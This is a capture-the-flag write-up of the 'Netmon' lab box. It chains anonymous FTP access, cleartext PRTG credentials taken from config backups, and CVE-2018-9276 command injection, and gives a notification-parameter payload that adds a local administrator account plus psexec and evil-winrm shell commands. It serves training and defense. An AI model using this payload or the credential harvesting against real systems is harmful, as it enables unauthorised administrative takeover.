---
title: Netmon
description: FTP anonymous access exposes PRTG config files with credentials. Those credentials unlock RCE on a network monitoring tool — and SYSTEM.
---

# Netmon

| | |
|---|---|
| **Difficulty** | Easy |
| **OS** | Windows Server 2016 |
| **CVE** | CVE-2018-9276 (PRTG Network Monitor RCE) |

Netmon is a lesson in credential exposure and the danger of default storage locations.
PRTG Network Monitor — a legitimate network management tool — stores its configuration including credentials in predictable flat files.
FTP anonymous access hands you the filesystem.
The rest follows naturally.

The blue team angle is strong here: PRTG is widely deployed in enterprise environments,
and this box shows exactly what happens when monitoring infrastructure is itself left unmonitored.

---

## Setup

Kali VM via QEMU. VPN config transferred from host via HTTP server, connected with openvpn.
If large packets time out, lower the MTU on the tunnel interface:

```bash
sudo ip link set tun0 mtu 1200
```

---

## Enumeration

```bash
ping <IP>
nmap -sC -sV -Pn <IP>
```

**Open ports to look for:**

| Port | Service | Detail |
|------|---------|--------|
| 21 | ftp | Anonymous login allowed |
| 80 | http | PRTG Network Monitor web UI |
| 135 | msrpc | Microsoft RPC |
| 139 | netbios-ssn | NetBIOS |
| 445 | microsoft-ds | SMB |

FTP and HTTP are the two attack surfaces. Start with FTP.

---

## FTP Anonymous Access

PRTG stores its data under `C:\ProgramData\Paessler\PRTG Network Monitor\`.
Anonymous FTP gives access to the full filesystem — navigate there and look for config files.

```bash
ftp <IP>
# user: anonymous
# pass: (blank or any email)
```

Files worth pulling:

```
PRTG Configuration.dat
PRTG Configuration.old
PRTG Configuration.old.bak
```

The `.old.bak` file is the one that tends to contain credentials in cleartext.
Download it and search for password fields.

```bash
get "PRTG Configuration.old.bak"
```

---

## Credential Discovery

Open the config file and search for credentials:

```bash
grep -i "password\|user\|admin" "PRTG Configuration.old.bak"
```

Note the username and password found.
Also note: config files often contain outdated credentials.
Think about what small change might make the old password current — a common pattern is appending the year.

---

## Web Application — PRTG

Navigate to `http://<IP>` and log in with the discovered credentials.
Confirm which version of PRTG is running — the version number matters for CVE-2018-9276.

PRTG versions before 18.2.39 are vulnerable to authenticated command injection via the notification system.

---

## Exploitation — CVE-2018-9276

PRTG allows admins to run custom notifications. The parameter handling is not properly sanitised —
a specially crafted notification name can execute arbitrary commands as SYSTEM.

The exploit path:
1. Create a new notification under **Setup > Account Settings > Notifications**
2. Set the notification type to **Execute Program**
3. Inject a payload into the parameter field

Common payload: add a new local administrator.

```
test.txt;net user <username> <password> /add;net localgroup administrators <username> /add
```

After triggering the notification (run it), verify the new user exists, then:

```bash
psexec.py <domain>/<username>:<password>@<IP> cmd.exe
# or
evil-winrm -i <IP> -u <username> -p <password>
```

This should land a shell as SYSTEM or at minimum Administrator.

---

## Flags

```cmd
type C:\Users\Public\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

**User flag:** `<!-- insert here -->`

**Root flag:** `<!-- insert here -->`

---

!!! example "Conclusion"
    Write this after completing the box.
    Cover: how anonymous FTP became the entry point, why stale config backups are dangerous,
    and what a defender should be looking for — FTP anonymous access alerts, PRTG running as SYSTEM, notification execution logs.
